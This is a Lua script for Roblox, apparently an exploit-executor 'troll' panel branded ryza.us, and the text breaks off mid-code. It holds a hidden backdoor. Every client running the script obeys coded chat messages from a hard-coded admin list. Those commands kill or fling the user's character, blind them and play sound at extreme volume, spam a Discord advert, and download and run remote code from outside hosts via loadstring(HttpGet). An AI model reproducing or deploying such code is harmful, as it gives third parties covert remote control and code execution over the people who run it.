if hookfunction and newcclosure then
    local originalHttpGet = game.HttpGet
    hookfunction(game.HttpGet, newcclosure(function(self, ...)
        if self == game then
            local url = select(1, ...)
            if url == originalHttpGet then
                while true do end
                return nil
            end
        end
        return originalHttpGet(self, ...)
    end))
end

local CommandsList = Instance.new("ScreenGui")
local InnerFrame = Instance.new("CanvasGroup")
local UICorner = Instance.new("UICorner")
local TopBar = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Close = Instance.new("ImageButton")
local Minimise = Instance.new("ImageButton")
local UIListLayout = Instance.new("UIListLayout")
local Inner = Instance.new("Frame")
local UIListLayout_2 = Instance.new("UIListLayout")
local Search = Instance.new("Frame")
local SearchInner = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local UIListLayout_3 = Instance.new("UIListLayout")
local SearchIcon = Instance.new("ImageLabel")
local TextBox = Instance.new("TextBox")
local UIPadding = Instance.new("UIPadding")
local Results = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIListLayout_4 = Instance.new("UIListLayout")
local UIPadding_2 = Instance.new("UIPadding")
local Template = Instance.new("CanvasGroup")
local UICorner_3 = Instance.new("UICorner")
local UIListLayout_5 = Instance.new("UIListLayout")
local Inner_2 = Instance.new("ImageButton")
local UIListLayout_6 = Instance.new("UIListLayout")
local Title_2 = Instance.new("TextLabel")
local Desc = Instance.new("TextLabel")
local UIPadding_3 = Instance.new("UIPadding")
local TopBarStroke = Instance.new("UIStroke")
local TemplateStroke = Instance.new("UIStroke")
local SearchStroke = Instance.new("UIStroke")
local MainStroke = Instance.new("UIStroke")

local LocalPlayer = game:GetService("Players").LocalPlayer
local Players = game:GetService("Players")

SearchStroke.Parent = SearchInner
SearchStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
SearchStroke.Color = Color3.new(1, 1, 1)
SearchStroke.LineJoinMode = Enum.LineJoinMode.Round
SearchStroke.Thickness = 1.5
SearchStroke.Transparency = 0.83

TopBarStroke.Parent = TopBar
TopBarStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
TopBarStroke.Color = Color3.new(1, 1, 1)
TopBarStroke.LineJoinMode = Enum.LineJoinMode.Round
TopBarStroke.Thickness = 1.5
TopBarStroke.Transparency = 0.83

TemplateStroke.Parent = Template
TemplateStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
TemplateStroke.Color = Color3.new(1, 1, 1)
TemplateStroke.LineJoinMode = Enum.LineJoinMode.Round
TemplateStroke.Thickness = 1.5
TemplateStroke.Transparency = 0.83

MainStroke.Parent = InnerFrame
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
MainStroke.Color = Color3.new(0, 0, 0)
MainStroke.LineJoinMode = Enum.LineJoinMode.Round
MainStroke.Thickness = 3
MainStroke.Transparency = 0.94

CommandsList.Name = "ryza.CommandsList"
CommandsList.Parent = LocalPlayer:WaitForChild("PlayerGui")
CommandsList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
CommandsList.IgnoreGuiInset = true
CommandsList.ResetOnSpawn = false

InnerFrame.Name = "InnerFrame"
InnerFrame.Parent = CommandsList
InnerFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InnerFrame.BackgroundTransparency = 0.300
InnerFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
InnerFrame.BorderSizePixel = 0
InnerFrame.Position = UDim2.new(0.393544734, 0, 0.268957347, 0)
InnerFrame.Size = UDim2.new(0, 300, 0, 390)
InnerFrame.Visible = false

UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = InnerFrame

TopBar.Name = "TopBar"
TopBar.Parent = InnerFrame
TopBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TopBar.BackgroundTransparency = 0.800
TopBar.BorderColor3 = Color3.fromRGB(0, 0, 0)
TopBar.BorderSizePixel = 0
TopBar.Size = UDim2.new(0, 300, 0, 45)

Title.Name = "Title"
Title.Parent = TopBar
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.0480000824, 0, 0, 0)
Title.Size = UDim2.new(0, 126, 0, 45)
Title.Font = Enum.Font.GothamMedium
Title.Text = "ryza.us ownership"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 16.000
Title.TextXAlignment = Enum.TextXAlignment.Left

Close.Name = "Close"
Close.Parent = TopBar
Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close.BackgroundTransparency = 1.000
Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.893333316, 0, 0.266666681, 0)
Close.Size = UDim2.new(0, 20, 0, 20)
Close.Image = "rbxassetid://11293981586"

Minimise.Name = "Minimise"
Minimise.Parent = TopBar
Minimise.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Minimise.BackgroundTransparency = 1.000
Minimise.BorderColor3 = Color3.fromRGB(0, 0, 0)
Minimise.BorderSizePixel = 0
Minimise.Position = UDim2.new(0.803333342, 0, 0.266666681, 0)
Minimise.Size = UDim2.new(0, 20, 0, 20)
Minimise.Image = "rbxassetid://11293980042"

UIListLayout.Parent = InnerFrame
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

Inner.Name = "Inner"
Inner.Parent = InnerFrame
Inner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Inner.BackgroundTransparency = 1.000
Inner.BorderColor3 = Color3.fromRGB(0, 0, 0)
Inner.BorderSizePixel = 0
Inner.LayoutOrder = 1
Inner.Position = UDim2.new(0, 0, 0.120512821, 0)
Inner.Size = UDim2.new(0, 300, 0, 345)

UIListLayout_2.Parent = Inner
UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder

Search.Name = "Search"
Search.Parent = Inner
Search.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Search.BackgroundTransparency = 1.000
Search.BorderColor3 = Color3.fromRGB(0, 0, 0)
Search.BorderSizePixel = 0
Search.Size = UDim2.new(0, 300, 0, 72)

SearchInner.Name = "SearchInner"
SearchInner.Parent = Search
SearchInner.AnchorPoint = Vector2.new(0.5, 0.5)
SearchInner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SearchInner.BackgroundTransparency = 0.900
SearchInner.BorderColor3 = Color3.fromRGB(0, 0, 0)
SearchInner.BorderSizePixel = 0
SearchInner.Position = UDim2.new(0.5, 0, 0.5, 0)
SearchInner.Size = UDim2.new(1, 0, 0, 35)

UICorner_2.CornerRadius = UDim.new(0, 10)
UICorner_2.Parent = SearchInner

UIListLayout_3.Parent = SearchInner
UIListLayout_3.FillDirection = Enum.FillDirection.Horizontal
UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_3.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout_3.Padding = UDim.new(0, 10)

SearchIcon.Name = "SearchIcon"
SearchIcon.Parent = SearchInner
SearchIcon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SearchIcon.BackgroundTransparency = 1.000
SearchIcon.BorderColor3 = Color3.fromRGB(0, 0, 0)
SearchIcon.BorderSizePixel = 0
SearchIcon.Size = UDim2.new(0, 20, 0, 20)
SearchIcon.Image = "rbxassetid://11293977875"
SearchIcon.ImageTransparency = 0.500

TextBox.Parent = SearchInner
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.173076928, 0, 0.300000012, 0)
TextBox.Size = UDim2.new(0, 215, 0, 14)
TextBox.Font = Enum.Font.GothamMedium
TextBox.PlaceholderText = "Search Commands (0)"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14.000
TextBox.TextXAlignment = Enum.TextXAlignment.Left

UIPadding.Parent = Search
UIPadding.PaddingLeft = UDim.new(0, 20)
UIPadding.PaddingRight = UDim.new(0, 20)

Results.Name = "Results"
Results.Parent = Inner
Results.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Results.BackgroundTransparency = 1.000
Results.BorderColor3 = Color3.fromRGB(0, 0, 0)
Results.BorderSizePixel = 0
Results.Position = UDim2.new(0, 0, 0.20869565, 0)
Results.Size = UDim2.new(0, 300, 0, 273)

ScrollingFrame.Parent = Results
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Size = UDim2.new(0.981333435, 0, 1, 0)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y

UIListLayout_4.Parent = ScrollingFrame
UIListLayout_4.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_4.Padding = UDim.new(0, 10)

UIPadding_2.Parent = ScrollingFrame
UIPadding_2.PaddingBottom = UDim.new(0, 20)
UIPadding_2.PaddingLeft = UDim.new(0, 20)
UIPadding_2.PaddingRight = UDim.new(0, 14)
UIPadding_2.PaddingTop = UDim.new(0, 2)

Template.Name = "Template"
Template.Parent = ScrollingFrame
Template.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Template.BackgroundTransparency = 0.900
Template.BorderColor3 = Color3.fromRGB(0, 0, 0)
Template.BorderSizePixel = 0
Template.Size = UDim2.new(1, 0, 0, 0)
Template.AutomaticSize = Enum.AutomaticSize.Y

UICorner_3.CornerRadius = UDim.new(0, 10)
UICorner_3.Parent = Template

UIListLayout_5.Parent = Template
UIListLayout_5.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_5.VerticalAlignment = Enum.VerticalAlignment.Center

Inner_2.Name = "Inner"
Inner_2.Parent = Template
Inner_2.Active = false
Inner_2.AnchorPoint = Vector2.new(0.5, 0.5)
Inner_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Inner_2.BackgroundTransparency = 1.000
Inner_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Inner_2.BorderSizePixel = 0
Inner_2.Position = UDim2.new(0.5, 0, 0.5, 0)
Inner_2.Selectable = false
Inner_2.Size = UDim2.new(1, 0, 0, 35)
Inner_2.AutomaticSize = Enum.AutomaticSize.Y

UIListLayout_6.Parent = Inner_2
UIListLayout_6.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_6.VerticalAlignment = Enum.VerticalAlignment.Center
UIListLayout_6.Padding = UDim.new(0, 5)

Title_2.Name = "Title"
Title_2.Parent = Inner_2
Title_2.Active = true
Title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title_2.BackgroundTransparency = 1.000
Title_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BorderSizePixel = 0
Title_2.Position = UDim2.new(0.0629801154, 0, 0, 0)
Title_2.Selectable = true
Title_2.Size = UDim2.new(0, 228, 0, 14)
Title_2.Font = Enum.Font.GothamMedium
Title_2.Text = "Template"
Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_2.TextSize = 14.000
Title_2.TextXAlignment = Enum.TextXAlignment.Left

Desc.Name = "Desc"
Desc.Parent = Inner_2
Desc.Active = true
Desc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Desc.BackgroundTransparency = 1.000
Desc.BorderColor3 = Color3.fromRGB(0, 0, 0)
Desc.BorderSizePixel = 0
Desc.Position = UDim2.new(0.0629801154, 0, 0.582822084, 0)
Desc.Selectable = true
Desc.Size = UDim2.new(0, 228, 0, 13)
Desc.Font = Enum.Font.GothamMedium
Desc.Text = "Description"
Desc.TextColor3 = Color3.fromRGB(255, 255, 255)
Desc.TextSize = 14.000
Desc.TextTransparency = 0.500
Desc.TextWrapped = true
Desc.TextXAlignment = Enum.TextXAlignment.Left
Desc.AutomaticSize = Enum.AutomaticSize.Y

UIPadding_3.Parent = Inner_2
UIPadding_3.PaddingBottom = UDim.new(0, 15)
UIPadding_3.PaddingTop = UDim.new(0, 15)

Template.Visible = false

local function addButton(data)
	local title = data.title
	local desc = data.desc
	local hovereffects = data.hovereffects
	local callback = data.callback

	-- // Main
	local newButton = Template:Clone()
	newButton.Parent = ScrollingFrame
	newButton.Inner.Title.Text = title
	newButton.Inner.Desc.Text = desc
	newButton.Name = title

	if hovereffects then
		local TweenService = game:GetService("TweenService")

		newButton.Inner.MouseEnter:Connect(function()
			TweenService:Create(
				newButton,
				TweenInfo.new(0.2),
				{Transparency = 0.6}
			):Play()
			local clicksound = Instance.new("Sound")
			clicksound.Volume = 0.2
			clicksound.SoundId = "rbxassetid://92876108656319"
			clicksound.Parent = newButton
			clicksound:Play()
		end)

		newButton.Inner.MouseLeave:Connect(function()
			TweenService:Create(
				newButton,
				TweenInfo.new(0.2),
				{Transparency = 0.9}
			):Play()
		end)
	end

	newButton.Inner.MouseButton1Click:Connect(function()
		callback()
		local hoversound = Instance.new("Sound")
		hoversound.Volume = 0.2
		hoversound.SoundId = "rbxassetid://6324790483"
		hoversound.Parent = newButton
		hoversound:Play()
	end)

	newButton.Visible = true
end

local function updateCount()
	local countOfCommands = 0

	for _,v in pairs(ScrollingFrame:GetChildren()) do
		if v:IsA("CanvasGroup") then
			if v.Name ~= "Template" then
				countOfCommands += 1
			end
		end
	end

	TextBox.PlaceholderText = `Search Commands ({countOfCommands})`
end

local chatConnections = {
	["Fling"] = "ryza.us(h63jbjshfahgffFRRFSE&T)",
	["Kill All"] = "ryza.us(k94hbdshdaghfGHTRSE&Y)",
	["Advertise"] = "ryza.us(m25lbjnsfrhgfGHYFSA&P)",
	["Spin"] = "ryza.us(t71kbjshyaggfFHHGSE&D)",
	["Unspin"] = "ryza.us(p38sbjahdrhgfDRTFSK&M)",
	["Sit"] = "ryza.us(z62rbjthaabgfJKLFSE&R)",
	["Flashbang"] = "ryza.us(w47cbjskfmhgfTYRFSA&Q)",
	["Jumpscare"] = "ryza.us(f83nbjshgdhgfBNMFSE&L)",
	["Blind"] = "ryza.us(g16dbjshdnhgfOPLFSG&X)",
	["Skyfall"] = "ryza.us(v59ybjshfrhgfQWEFSJ&Z)",
	["Bring"] = "ryza.us(c32ebjshfzhgfUIOFSE&W)",
	["Sprint Walkspeed"] = "ryza.us(a74jbjshmthgfPOIFSE&N)",
	["Slow Walkspeed"] = "ryza.us(b91qbjshfyhgfLKJFSE&F)",
	["Default Walkspeed"] = "ryza.us(s28xbjshfbhgfVCXFSE&G)",
	["Toggle Freeze"] = "ryza.us(n45ubjshfkhgfZXCFSE&H)",
	["Toggle UnFreeze"] = "ryza.us(suagfbascbyfZXCSREJ&H)",
	["Kill Others"] = "ryza.us(q67ibjshflhgfASWFSE&J)",
	["Execute AK Admin"] = "ryza.us(q67neyshflhgfANIGSE&R)"
}

local adminsTable = {
	"lvasion",
	"ikDebris",
	"restaxts",
	"NitroNukexYT",
	"WealthyZeno",
	--temp ones
	"Duckenbrood",
	"larged4inyo_a4" --end at 09/06/2025
}

local spinConnection

local function handleCommandExeption(player, message)
	local permitted = false

	if player then
		for _,v in pairs(adminsTable) do
			if string.lower(player.Name) == string.lower(v) then
				permitted = true
			end
		end
	end

	if permitted then
		if message == chatConnections["Fling"] then
			if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
				local humanoidRootPart = LocalPlayer.Character.HumanoidRootPart
				local oldVelocity = humanoidRootPart.Velocity
				local oldCanCollide = humanoidRootPart.CanCollide

				humanoidRootPart.CanCollide = true
				humanoidRootPart.Velocity = Vector3.new(
					math.random(-100, 100), 
					math.random(200, 500), 
					math.random(-100, 100)
				) * 100000 / 10000

				local bodyForce = Instance.new("BodyForce")
				bodyForce.Force = Vector3.new(
					math.random(-100, 100), 
					math.random(200, 500), 
					math.random(-100, 100)
				) * 100000
				bodyForce.Parent = humanoidRootPart

				game:GetService("Debris"):AddItem(bodyForce, 0.1)

				task.delay(0.1, function()
					if humanoidRootPart and humanoidRootPart.Parent then
						humanoidRootPart.CanCollide = oldCanCollide
						task.delay(1, function()
							if humanoidRootPart and humanoidRootPart.Parent then
								humanoidRootPart.Velocity = oldVelocity
							end
						end)
					end
				end)
			end
		elseif message == chatConnections["Kill All"] then
			if LocalPlayer.Character then
				LocalPlayer.Character.Humanoid.Health = 0
			end
		elseif message == chatConnections["Advertise"] then
			local TextChatService = game:GetService("TextChatService")
			local ReplicatedStorage = game:GetService("ReplicatedStorage")

			local blob = "\u{000D}"
			local clearMessage = ""..string.rep(blob, 197)..""

			local function chatMessage(str)
				str = tostring(str)
				if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
					local generalChannel = TextChatService:FindFirstChild("TextChannels")
					if generalChannel then
						generalChannel = generalChannel:FindFirstChild("RBXGeneral")
						if generalChannel then
							generalChannel:SendAsync(str)
						else
							warn("RBXGeneral channel not found!") 
						end
					else
						warn("TextChannels not found!")
					end
				else
					local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
					if chatEvents then
						local chatEvent = chatEvents:FindFirstChild("SayMessageRequest")
						if chatEvent then
							chatEvent:FireServer(str, "All")
						else
							warn("SayMessageRequest event not found!")
						end
					else
						warn("DefaultChatSystemChatEvents not found!")
					end
				end
			end

			for i = 1, 1 do
				chatMessage(clearMessage) 
			end

			loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Anthony's%20ACL"))()

			wait(1)

			local StarterGui = game:GetService("StarterGui")
			local Players = game:GetService("Players")
			local player = Players.LocalPlayer

			StarterGui:SetCore("SendNotification", {
				Title = "ryza.us",
				Text = "You need to change your Roblox Language to Қазақ тілі so it won't get tagged",
				Duration = 5
			})

			local TextChatService = game:GetService("TextChatService")
			local ReplicatedStorage = game:GetService("ReplicatedStorage")

			local blob = ""

			wait(0.1)
			local newMessage = blob .. "\r" ..
				"ryza.us" .. blob .. "\r" ..
				" ---------------------  " .. blob .. "\r" ..
				blob .. "\r" ..
				blob .. "\r" ..
				blob .. "\r" ..
				blob .. "\r" ..
				"join the best script ever, ryza.us: join now at  " .. blob .. "\r" ..
				blob .. "\r" ..
				blob .. "\r" ..
				blob .. "\r" ..
				" ---------------------  " .. blob .. "\r" ..
				".gg/Bm4syhCu5s" 

			local function sendMessage()
				if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
					chatMessage(newMessage)
				end
			end

			local retries = 3
			while retries > 0 do
				local success, err = pcall(sendMessage)
				if success then
					break
				else
					warn("Failed to send message: " .. err)
					retries = retries - 1
					wait(1)
				end
			end

			if retries == 0 then
				warn("Failed to send message after multiple attempts.")
			end
		elseif message == chatConnections["Spin"] then
			if spinConnection then
				spinConnection:Disconnect()
			end

			spinConnection = game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
				if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
					LocalPlayer.Character.HumanoidRootPart.CFrame = 
						LocalPlayer.Character.HumanoidRootPart.CFrame * 
						CFrame.Angles(0, math.rad(30 * deltaTime * 60), 0)
				end
			end)
		elseif message == chatConnections["Unspin"] then
			if spinConnection then
				spinConnection:Disconnect()
				spinConnection = nil
			end
		elseif message == chatConnections["Sit"] then
			if LocalPlayer.Character then
				LocalPlayer.Character.Humanoid.Sit = true
			end
		elseif message == chatConnections["Flashbang"] then
			local blindGui = Instance.new("ScreenGui")
			blindGui.IgnoreGuiInset = true
			blindGui.ResetOnSpawn = false
			blindGui.DisplayOrder = 8375298532
			blindGui.Parent = game:GetService("CoreGui") or LocalPlayer.PlayerGui

			local blindFrame = Instance.new("Frame")
			blindFrame.Parent = blindGui
			blindFrame.Visible = false
			blindFrame.AnchorPoint = Vector2.new(0.5, 0.5)
			blindFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
			blindFrame.Size = UDim2.new(2, 0, 2, 0)
			blindFrame.BackgroundColor3 = Color3.new(1, 1, 1)
			blindFrame.Visible = true
			
			local soundNew = Instance.new("Sound")
			soundNew.SoundId = "rbxassetid://17659239587"
			soundNew.Volume = 13842423
			soundNew.Parent = blindGui
			soundNew.Looped = true
			soundNew:Play()

			task.wait(10)
			blindGui:Destroy()
		elseif message == chatConnections["Jumpscare"] then
			local blindGui = Instance.new("ScreenGui")
			blindGui.IgnoreGuiInset = true
			blindGui.ResetOnSpawn = false
			blindGui.DisplayOrder = 8375298532
			blindGui.Parent = game:GetService("CoreGui") or LocalPlayer.PlayerGui

			local blindFrame = Instance.new("ImageLabel")
			blindFrame.Parent = blindGui
			blindFrame.Visible = false
			blindFrame.AnchorPoint = Vector2.new(0.5, 0.5)
			blindFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
			blindFrame.Size = UDim2.new(1, 0, 1, 0)
			blindFrame.BackgroundColor3 = Color3.new(1, 1, 1)
			blindFrame.Visible = true
			blindFrame.Image = "rbxassetid://6337170651"

			local soundNew = Instance.new("Sound")
			soundNew.SoundId = "rbxassetid://1592934514"
			soundNew.Volume = 13842423
			soundNew.Parent = blindGui
			soundNew:Play()

			task.wait(5)
			blindGui:Destroy()
		elseif message == chatConnections["Blind"] then
			local blindGui = Instance.new("ScreenGui")
			blindGui.IgnoreGuiInset = true
			blindGui.ResetOnSpawn = false
			blindGui.DisplayOrder = 8375298532
			blindGui.Parent = game:GetService("CoreGui") or LocalPlayer.PlayerGui

			local blindFrame = Instance.new("Frame")
			blindFrame.Parent = blindGui
			blindFrame.Visible = false
			blindFrame.AnchorPoint = Vector2.new(0.5, 0.5)
			blindFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
			blindFrame.Size = UDim2.new(2, 0, 2, 0)
			blindFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			blindFrame.Visible = true

			task.wait(10)
			blindGui:Destroy()
		elseif message == chatConnections["Skyfall"] then
			if LocalPlayer.Character then
				LocalPlayer.Character:SetPrimaryPartCFrame(LocalPlayer.Character.PrimaryPart.CFrame * CFrame.new(0, 10000, 0))
			end
		elseif message == chatConnections["Bring"] then
			if LocalPlayer.Character and player.Character then
				LocalPlayer.Character:SetPrimaryPartCFrame(player.Character.HumanoidRootPart.CFrame)
			end
		elseif message == chatConnections["Sprint Walkspeed"] then
			if LocalPlayer.Character then
				LocalPlayer.Character.Humanoid.WalkSpeed = 25
			end
		elseif message == chatConnections["Slow Walkspeed"] then
			if LocalPlayer.Character then
				LocalPlayer.Character.Humanoid.WalkSpeed = 5
			end
		elseif message == chatConnections["Default Walkspeed"] then
			if LocalPlayer.Character then
				LocalPlayer.Character.Humanoid.WalkSpeed = 17
			end
		elseif message == chatConnections["Toggle Freeze"] then
			if LocalPlayer.Character then
				LocalPlayer.Character.HumanoidRootPart.Anchored = true
			end
		elseif message == chatConnections["Toggle UnFreeze"] then
			if LocalPlayer.Character then
				LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end
		elseif message == chatConnections["Kill Others"] then
			if LocalPlayer.Character and LocalPlayer.Name ~= player.Name then
				if LocalPlayer.Character then
					LocalPlayer.Character.Humanoid.Health = 0
				end
			end
		elseif message == chatConnections["Execute AK Admin"] then
			loadstring(game:HttpGet("https://angelical.me/ak.lua"))()
		end
	else
		warn(player.Name .. " attempted to run ryza.us troll command")
		warn("- user is not authorised")
	end
end

LocalPlayer.Chatted:Connect(function(message)
	handleCommandExeption(LocalPlayer, message)
end)

for _,v in pairs(Players:GetPlayers()) do
	v.Chatted:Connect(function(message)
		handleCommandExeption(v, message)
	end)
end

Players.PlayerAdded:Connect(function(v)
	v.Chatted:Connect(function(message)
		handleCommandExeption(v, message)
	end)
end)

ScrollingFrame.ChildAdded:Connect(function(child)
	task.wait(0.5)
	updateCount()
end)

ScrollingFrame.ChildRemoved:Connect(function(child)
	task.wait(0.5)
	updateCount()
end)

Minimise.MouseButton1Click:Connect(function()
	local TweenService = game:GetService("TweenService")

	if InnerFrame.Size == UDim2.new(0, 300, 0, 390) then
		TweenService:Create(
			InnerFrame,
			TweenInfo.new(0.5),
			{Size = UDim2.new(0, 300, 0, 45)}
		):Play()
	else
		TweenService:Create(
			InnerFrame,
			TweenInfo.new(0.5),
			{Size = UDim2.new(0, 300, 0, 390)}
		):Play()
	end
end)

Close.MouseButton1Click:Connect(function()
	InnerFrame.Visible = false
end)

TextBox:GetPropertyChangedSignal("Text"):Connect(function()
	local newText = TextBox.Text:lower()

	for _, v in pairs(ScrollingFrame:GetChildren()) do
		if v:IsA("CanvasGroup") and v.Name ~= "Template" then
			if newText == "" or v.Name:lower():find(newText, 1, true) then
				v.Visible = true
				updateCount()
			else
				v.Visible = false
				updateCount()
			end
		end
	end
end)

local UserInputService = game:GetService("UserInputService")

local dragging = false
local dragStart
local startPos

local function updateInput(input)
	local delta = input.Position - dragStart
	InnerFrame.Position = UDim2.new(
		startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y
	)
end

TopBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = InnerFrame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		updateInput(input)
	end
end)

-- // ryza was here

addButton({
	title = "Fling",
	desc = "Fling all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Fling"])
	end,
})
addButton({
	title = "Kill",
	desc = "Kill all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Kill All"])
	end,
})
addButton({
	title = "Advertise",
	desc = "Advertise all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Advertise"])
	end,
})
addButton({
	title = "Spin",
	desc = "Spin all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Spin"])
	end,
})
addButton({
	title = "Unspin",
	desc = "Unspin all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Unspin"])
	end,
})
addButton({
	title = "Execute AK Admin",
	desc = "Execute all script users with AK Admin",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Execute AK Admin"])
	end,
})
addButton({
	title = "Sit",
	desc = "Sit all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Sit"])
	end,
})
addButton({
	title = "Flashbang",
	desc = "Flashbang all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Flashbang"])
	end,
})
addButton({
	title = "Jumpscare",
	desc = "Jumpscare all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Jumpscare"])
	end,
})
addButton({
	title = "Blind",
	desc = "Blind all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Blind"])
	end,
})
addButton({
	title = "Skyfall",
	desc = "Skyfall all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Skyfall"])
	end,
})
addButton({
	title = "Bring",
	desc = "Bring all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Bring"])
	end,
})
addButton({
	title = "Sprint Walkspeed",
	desc = "Sprint Walkspeed all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Sprint Walkspeed"])
	end,
})
addButton({
	title = "Slow Walkspeed",
	desc = "Slow Walkspeed all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Slow Walkspeed"])
	end,
})
addButton({
	title = "Default Walkspeed",
	desc = "Default Walkspeed all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Default Walkspeed"])
	end,
})
addButton({
	title = "Toggle Freeze",
	desc = "Freeze all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Toggle Freeze"])
	end,
})
addButton({
	title = "Toggle UnFreeze",
	desc = "Unfreeze all script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Toggle UnFreeze"])
	end,
})
addButton({
	title = "Kill Others",
	desc = "Kill other script users",
	hovereffects = true,
	callback = function()
		Players:Chat(chatConnections["Kill Others"])
	end,
})

task.wait()
updateCount()

local permitted = false

if LocalPlayer then
	for _,v in pairs(adminsTable) do
		if string.lower(LocalPlayer.Name) == string.lower(v) then
			permitted = true
		end
	end
end

if permitted then
	InnerFrame.Visible = true

	UserInputService.InputBegan:Connect(function(input, processed)
		if not processed and input then
			if input.KeyCode == Enum.KeyCode.K then
				InnerFrame.Visible = not InnerFrame.Visible
			end
		end
	end)

	if UserInputService.TouchEnabled then
		local RyzaMobile = Instance.new("ScreenGui")
		RyzaMobile.Name = "RyzaMobile"
		RyzaMobile.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		RyzaMobile.Parent = game:GetService("CoreGui")

		local OpenButton = Instance.new("TextButton")
		OpenButton.Name = "OpenButton"
		OpenButton.Text = "ryza.us"
		OpenButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		OpenButton.TextSize = 16
